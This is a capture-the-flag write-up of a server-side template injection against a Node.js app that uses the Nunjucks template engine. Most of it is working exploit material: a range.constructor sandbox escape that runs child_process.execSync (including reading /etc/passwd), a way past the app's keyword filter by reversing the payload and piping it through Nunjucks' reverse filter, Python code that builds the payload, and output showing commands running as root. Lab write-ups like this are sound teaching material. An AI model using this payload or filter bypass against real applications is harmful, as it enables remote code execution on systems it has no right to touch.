# Node Version Write-up

Looking at it we have almost the same things as the Easy version.

  - Screen that Replicates the gift requests
  - Debug to see the code.
  
However, this time its not flask, but Node.js (What fun)

We also have a *slightly* irritating filter.  I know that these are common words used to stop
RCE in node / JS applications.

```
    //Filter
    var filterList = ["require", "child-process","exec"]
    for (var i=0; i<filterList.length; i++){
	theKing = theKing.replace(filterList[i], "");
	name = name.replace(filterList[i],"");
    }
```

## Checking for SSTI

http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine

Its mostly the same as the easy challenge here.

If we run the payload ```king = {{ 4+ 4}}``` we get code execution

```
<div class="container">
    <h2>Error</h2><div class='alert alert-danger' role='alert'>ERROR:  8 is not a King</div>
  </div>
```

And we can also use the object creation function from the above (see checkPayload)
NOTE:  Its a nice similarity to the ().__item__ thing from Python


```
<div class="container">
    <h2>Error</h2><div class='alert alert-danger' role='alert'>ERROR:  [object Object] is not a King</div>
```

However to hit the rest of the thing we need to start using reserved words.

## Bypassing the filter

!!! note

	I had a play with injecting into the string using other parameters,
	but to be honest JavaScript string concatenation bamboozled me.  Either way it turns 
	out there's a much easier way
	
We now have the problem of the filter.  Given the tutorial above we want to be running something like 
this

```
range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()
```

But we have all 3 of our blocked words in there, an it fails with an error. (failedExploit)

```
<pre>Template render error: (unknown path)<br> &nbsp;Template render error: (unknown path)<br> &nbsp;Template render error: (unknown path)<br> &nbsp;SyntaxError: Unexpected token &#39;(&#39;<br> &nbsp; 
```

As i said, tried accessing global, but they didn't appear to exist (I couldn't find them)
SO we look through the nunjucks docs for anything useful like the 
[Reverse Function](https://mozilla.github.io/nunjucks/templating.html#reverse)


So out POC looks like this

  - Write a payload that executes a command
  - Reverse it
  - SSTI it 
  - Pass the injected text through the builtin *reverse* filter
  
We can build this up in stages (see run command)


Build our inner payload and reverse it

```
kingString = "return global.process.mainModule.require('child_process').execSync('{0}')".format(theCommand)
#Reverse the Thing
revString = kingString[::-1]
```

The splice it into the ```range.constructor```  along with the reverse command

```
    payloadString = '{{{{range.constructor("{0}\" | reverse )()}}}}'.format(revString)
```

Output is 

```
{{range.constructor(")'di'(cnyScexe.)'ssecorp_dlihc'(eriuqer.eludoMniam.ssecorp.labolg nruter" | reverse )()}}
```



Running with ID gives us details

```
 <h2>Error</h2><div class='alert alert-danger' role='alert'>ERROR:  uid=0(root) gid=0(root) groups=0(root
 ```

## Flags

TODO,  when I add them propoerly
